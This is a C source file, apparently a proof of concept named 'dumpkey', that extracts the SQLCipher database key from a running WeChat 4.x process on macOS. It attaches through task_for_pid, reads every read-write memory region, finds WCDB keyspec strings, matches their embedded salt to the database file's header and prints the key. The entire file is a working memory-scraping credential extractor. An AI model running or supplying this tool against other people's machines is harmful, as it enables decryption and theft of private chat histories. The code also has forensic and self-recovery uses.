// clang poc.c -o dumpkey -O3 -flto
//
// Extracts the SQLCipher encryption key from a running WeChat process on macOS.
//
// Strategy (WeChat 4.x / WCDB):
//   1. Read the first page of the encrypted .db file (contains salt + HMAC).
//   2. Scan the WeChat process's heap memory for WCDB keyspec strings.
//      WCDB stores the key in memory as a 99-byte ASCII string:
//        x'<64 hex chars (32-byte key)><32 hex chars (16-byte salt)>'
//      See WCDB AbstractHandle.cpp: WCTAssert(rawCipherSize == 99)
//   3. For each keyspec found, decode the embedded salt (last 16 bytes of the
//      keyspec) and compare it against the first 16 bytes of the db file.
//      SQLCipher writes the salt at the very start of the database file, and
//      WCDB stores the same salt inside the keyspec — so a salt match uniquely
//      identifies the correct keyspec for a given db file. No HMAC needed.
//      (This mirrors the Python reference: find_key.py → salt_to_dbs.get(salt))

#include <mach/mach.h>
#include <mach/mach_vm.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// SQLCipher/WCDB constants for WeChat 4.x.
// WeChat 4.x uses WCDB with 4096-byte pages.
#define SQLCIPHER_KEY_SIZE 32
#define SALT_SIZE 16

// WCDB keyspec format: x'<64 hex key chars><32 hex salt chars>'
// Total length: 2 + 64 + 32 + 1 = 99 bytes.
// See: https://github.com/Tencent/wcdb — AbstractHandle.cpp: WCTAssert(rawCipherSize == 99)
#define KEY_HEX_LEN  (SQLCIPHER_KEY_SIZE * 2) // 64
#define SALT_HEX_LEN (SALT_SIZE * 2)          // 32
#define KEYSPEC_LEN  (2 + KEY_HEX_LEN + SALT_HEX_LEN + 1) // 99

// Parse a hex nibble. Returns -1 if not a valid hex char.
static int hexval(char c) {
  if (c >= '0' && c <= '9') return c - '0';
  if (c >= 'a' && c <= 'f') return c - 'a' + 10;
  if (c >= 'A' && c <= 'F') return c - 'A' + 10;
  return -1;
}

// Check if buf points to a valid WCDB keyspec: x'<96 hex chars>'
// If valid, decode the 32-byte key into out_key and 16-byte salt into out_salt.
static bool parse_keyspec(const unsigned char *buf,
                          unsigned char *out_key, unsigned char *out_salt) {
  if (buf[0] != 'x' || buf[1] != '\'')
    return false;
  for (int i = 0; i < KEY_HEX_LEN + SALT_HEX_LEN; i++) {
    if (hexval(buf[2 + i]) < 0)
      return false;
  }
  if (buf[2 + KEY_HEX_LEN + SALT_HEX_LEN] != '\'')
    return false;

  // Decode the first 64 hex chars (32-byte key)
  for (int i = 0; i < SQLCIPHER_KEY_SIZE; i++) {
    int hi = hexval(buf[2 + i * 2]);
    int lo = hexval(buf[2 + i * 2 + 1]);
    out_key[i] = (unsigned char)((hi << 4) | lo);
  }
  // Decode the last 32 hex chars (16-byte salt)
  for (int i = 0; i < SALT_SIZE; i++) {
    int hi = hexval(buf[2 + KEY_HEX_LEN + i * 2]);
    int lo = hexval(buf[2 + KEY_HEX_LEN + i * 2 + 1]);
    out_salt[i] = (unsigned char)((hi << 4) | lo);
  }
  return true;
}

// Scans a running WeChat process's memory to find the SQLCipher encryption key.
//
// Writes the key as a hex string to `out_key_hex` (must be >= 65 bytes).
// Returns 0 on success, -1 on failure.
int extract_key_from_process(pid_t wechat_pid, const char *db_path,
                             char *out_key_hex) {
  mach_port_name_t task_port;
  kern_return_t kr;

  // Attach to the target process via Mach task port
  kr = task_for_pid(mach_task_self(), wechat_pid, &task_port);
  if (kr != KERN_SUCCESS) {
    fprintf(stderr, "%s (%d)\n", mach_error_string(kr), kr);
    return -1;
  }

  // Read the first 16 bytes (salt) of the db file.
  // SQLCipher stores a random salt at the start of the first page.
  // The WCDB keyspec also contains this same salt, so we match them to identify
  // which keyspec in memory belongs to this db file — no HMAC needed.
  // This mirrors the Python approach: salt_to_dbs.get(salt, [])
  unsigned char db_salt[SALT_SIZE];
  FILE *fp = fopen(db_path, "rb");
  if (!fp || fread(db_salt, 1, SALT_SIZE, fp) != SALT_SIZE) {
    fprintf(stderr, "failed to read db file\n");
    if (fp)
      fclose(fp);
    return -1;
  }
  fclose(fp);

  // Prefix to search for: x' (start of WCDB keyspec)
  static const unsigned char KEYSPEC_PREFIX[] = {'x', '\''};

  // Enumerate all memory regions in the target process
  mach_vm_address_t region_addr = 0;
  mach_vm_size_t region_size;
  vm_region_extended_info_data_t region_info;
  mach_msg_type_number_t info_count = VM_REGION_EXTENDED_INFO_COUNT;
  mach_port_t object_name;

  while (1) {
    kr = mach_vm_region(task_port, &region_addr, &region_size,
                        VM_REGION_EXTENDED_INFO, (vm_region_info_t)&region_info,
                        &info_count, &object_name);
    if (kr != KERN_SUCCESS)
      break;

    // Scan all readable+writable regions. WCDB's SQLCipher allocator wraps
    // the system malloc, so keyspec strings may appear in any RW heap region.
    if ((region_info.protection & VM_PROT_READ) &&
        (region_info.protection & VM_PROT_WRITE)) {

      unsigned char *region_data = malloc(region_size);

      mach_vm_size_t bytes_read = 0;
      kr = mach_vm_read_overwrite(task_port, region_addr, region_size,
                                  (mach_vm_address_t)region_data, &bytes_read);
      if (kr != KERN_SUCCESS) {
        free(region_data);
        region_addr += region_size;
        continue;
      }

      // Scan this region for all occurrences of the keyspec prefix "x'"
      unsigned char *scan_pos = region_data;
      unsigned char *region_end = region_data + bytes_read;
      while ((scan_pos = memmem(scan_pos, region_end - scan_pos,
                                KEYSPEC_PREFIX, sizeof(KEYSPEC_PREFIX)))) {
        if (scan_pos + KEYSPEC_LEN <= region_end) {
          unsigned char candidate_key[SQLCIPHER_KEY_SIZE];
          unsigned char candidate_salt[SALT_SIZE];
          // Match keyspec to db file by comparing the embedded salt against
          // the first 16 bytes of the db file — same strategy as the Python
          // reference implementation (find_key.py: salt_to_dbs.get(salt))
          if (parse_keyspec(scan_pos, candidate_key, candidate_salt) &&
              memcmp(candidate_salt, db_salt, SALT_SIZE) == 0) {
            for (int i = 0; i < SQLCIPHER_KEY_SIZE; i++)
              sprintf(out_key_hex + i * 2, "%02x", candidate_key[i]);
            free(region_data);
            return 0;
          }
        }
        scan_pos++;
      }
      free(region_data);
    }
    region_addr += region_size;
  }

  return -1;
}

int main(int argc, char *argv[]) {
  if (argc < 3) {
    fprintf(stderr, "Usage: %s <wechat_pid> <encrypted_db_path>\n", argv[0]);
    return -1;
  }

  pid_t wechat_pid = atoi(argv[1]);

  char key_hex[100] = {0};
  if (extract_key_from_process(wechat_pid, argv[2], key_hex) == 0) {
    printf("key: %s\n", key_hex);
  } else {
    printf("not found key\n");
  }

  return 0;
}
